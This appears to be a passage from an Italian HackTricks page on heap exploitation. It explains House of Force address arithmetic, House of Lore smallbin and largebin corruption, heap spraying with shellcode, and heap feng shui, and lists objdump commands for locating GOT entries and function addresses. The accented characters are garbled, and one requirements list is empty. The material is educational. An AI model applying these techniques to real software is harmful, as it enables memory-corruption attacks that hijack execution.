La vittima raccoglie il valore dell'indirizzo del pezzo wilderness attuale (l'attuale av->top) e il resto √® esattamente la somma di quell'indirizzo pi√π la quantit√† di byte richiesti da malloc(). Quindi se \&EIP-8 √® in 0xbffff224 e av->top contiene 0x080c2788, allora la quantit√† che dobbiamo riservare nel malloc controllato affinch√© av->top punti a $EIP-8 per il prossimo malloc() sar√†:

0xbffff224 - 0x080c2788 = 3086207644.

Quindi verr√† salvato in av->top il valore alterato e il prossimo malloc punter√† all'EIP e potr√† sovrascriverlo.

√à importante sapere che la dimensione del nuovo pezzo wilderness sia pi√π grande della richiesta fatta dall'ultimo malloc(). Cio√®, se il wilderness punta a \&EIP-8, la dimensione sar√† esattamente nel campo EBP dello stack.

**The House of Lore**

**Corruzione SmallBin**

I pezzi liberati vengono inseriti nel bin in base alla loro dimensione. Ma prima di essere inseriti vengono conservati in unsorted bins. Un pezzo liberato non viene immediatamente inserito nel suo bin ma rimane in unsorted bins. Successivamente, se viene riservato un nuovo pezzo e il precedente liberato pu√≤ servire, viene restituito, ma se viene riservato un pezzo pi√π grande, il pezzo liberato in unsorted bins viene inserito nel suo bin appropriato.

Per raggiungere il codice vulnerabile, la richiesta di memoria deve essere maggiore di av->max\_fast (di solito 72) e inferiore a MIN\_LARGE\_SIZE (512).

Se nel bin c'√® un pezzo della dimensione adeguata a ci√≤ che viene richiesto, viene restituito dopo essere stato scollegato:

bck = vittima->bk; Puntatore al pezzo precedente, √® l'unica informazione che possiamo alterare.

bin->bk = bck; Il penultimo pezzo diventa l'ultimo, nel caso in cui bck punti allo stack al prossimo pezzo riservato verr√† assegnato questo indirizzo

bck->fd = bin; Si chiude la lista facendo s√¨ che punti a bin

√à necessario:
**Corruzione LargeBin**

Sono necessari gli stessi requisiti di prima e alcuni in pi√π, inoltre i chunk allocati devono essere superiori a 512.

L'attacco √® simile a quello precedente, cio√® bisogna modificare il puntatore bk e sono necessarie tutte quelle chiamate a malloc(), ma in pi√π bisogna modificare la dimensione del chunk modificato in modo che quella dimensione - nb sia < MINSIZE.

Ad esempio, bisogna impostare la dimensione a 1552 in modo che 1552 - 1544 = 8 < MINSIZE (la sottrazione non pu√≤ essere negativa perch√© si confronta con un unsigned)

Inoltre √® stato introdotto un patch per rendere l'attacco ancora pi√π complicato.

**Heap Spraying**

Fondamentalmente consiste nel prenotare tutta la memoria possibile per gli heap e riempirli con un tappetino di nops seguito da una shellcode. Inoltre, come tappetino si utilizza 0x0c. Si cercher√† di saltare all'indirizzo 0x0c0c0c0c, quindi se si sovrascrive un indirizzo a cui verr√† chiamato questo tappetino, si salter√† l√¨. Fondamentalmente la tattica √® prenotare il massimo possibile per vedere se si sovrascrive qualche puntatore e saltare a 0x0c0c0c0c sperando che ci siano nops l√¨.

**Heap Feng Shui**

Consiste nel cementare la memoria mediante prenotazioni e liberazioni in modo che ci siano chunk prenotati tra chunk liberi. Il buffer da traboccare sar√† in uno di questi chunk.

**objdump -d eseguibile** ‚Äî> Disas funzioni\
**objdump -d ./PROGRAMMA | grep FUNZIONE** ‚Äî> Ottieni l'indirizzo della funzione\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Per verificare che sia effettivamente la nostra shellcode e ottenere gli OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabella dei simboli, per ottenere l'indirizzo delle variabili e delle funzioni\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Per ottenere l'indirizzo delle funzioni delle librerie (GOT)\
**objdump -d ./exec | grep codiceFunzione**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Ottiene l'indirizzo di puts da sovrascrivere nella GOT\
**objdump -D ./exec** ‚Äî> Disas TUTTO fino agli ingressi della plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info sulla funzione in gdb

## Corsi interessanti

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Riferimenti**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
